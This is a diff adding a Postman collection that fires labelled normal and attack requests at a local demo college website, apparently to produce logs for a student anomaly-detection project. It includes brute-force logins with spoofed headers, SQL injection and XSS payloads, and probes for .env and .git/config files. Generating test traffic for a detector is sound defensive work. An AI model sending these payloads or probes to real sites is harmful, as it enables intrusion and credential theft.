@@ -1,0 +1,110 @@
+{
+  "info": {
+    "name": "College Website - Attack Demonstrations",
+    "description": "Manual attack requests against the demo college website (site/app.py) for the log anomaly detection project. Run site/app.py first, then send these requests from Postman one at a time (or use Postman's Runner to fire the Brute Force folder repeatedly).",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://127.0.0.1:5000" }
+  ],
+  "item": [
+    {
+      "name": "Normal Traffic",
+      "item": [
+        { "name": "Home page", "request": { "method": "GET", "url": "{{baseUrl}}/" } },
+        { "name": "Library (valid search)", "request": { "method": "GET", "url": "{{baseUrl}}/library?q=algorithms" } },
+        { "name": "Results (valid roll number)", "request": { "method": "GET", "url": "{{baseUrl}}/results?roll_no=CS2021001" } },
+        { "name": "Download prospectus PDF", "request": { "method": "GET", "url": "{{baseUrl}}/static/downloads/prospectus.pdf" } },
+        {
+          "name": "Successful login",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/login",
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "username", "value": "student1" },
+              { "key": "password", "value": "demo123" }
+            ] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Brute Force (run this request repeatedly via Postman Runner)",
+      "item": [
+        {
+          "name": "Failed login attempt",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/login",
+            "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.20" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "username", "value": "student1" },
+              { "key": "password", "value": "wrongpassword{{$randomInt}}" }
+            ] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "SQL Injection",
+      "item": [
+        {
+          "name": "Results - classic OR payload",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/results?roll_no=' OR '1'='1",
+            "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.30" }]
+          }
+        },
+        {
+          "name": "Results - UNION SELECT payload",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/results?roll_no=' UNION SELECT username, email FROM users--",
+            "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.30" }]
+          }
+        },
+        {
+          "name": "Library - OR 1=1 payload",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/library?q=' OR 1=1--",
+            "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.30" }]
+          }
+        }
+      ]
+    },
+    {
+      "name": "Reconnaissance",
+      "item": [
+        { "name": "Admin portal", "request": { "method": "GET", "url": "{{baseUrl}}/admin", "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.40" }] } },
+        { "name": ".env", "request": { "method": "GET", "url": "{{baseUrl}}/.env", "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.40" }] } },
+        { "name": ".git config", "request": { "method": "GET", "url": "{{baseUrl}}/.git/config", "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.40" }] } },
+        { "name": "config", "request": { "method": "GET", "url": "{{baseUrl}}/config", "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.40" }] } },
+        { "name": "wp-login.php", "request": { "method": "GET", "url": "{{baseUrl}}/wp-login.php", "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.40" }] } },
+        { "name": "phpmyadmin", "request": { "method": "GET", "url": "{{baseUrl}}/phpmyadmin", "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.40" }] } }
+      ]
+    },
+    {
+      "name": "XSS",
+      "item": [
+        {
+          "name": "Library - script tag",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/library?q=<script>alert(1)</script>",
+            "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.60" }]
+          }
+        },
+        {
+          "name": "Results - svg onload",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/results?roll_no=<svg/onload=alert(1)>",
+            "header": [{ "key": "X-Forwarded-For", "value": "203.0.113.60" }]
+          }
+        }
+      ]
+    }
+  ]
+}
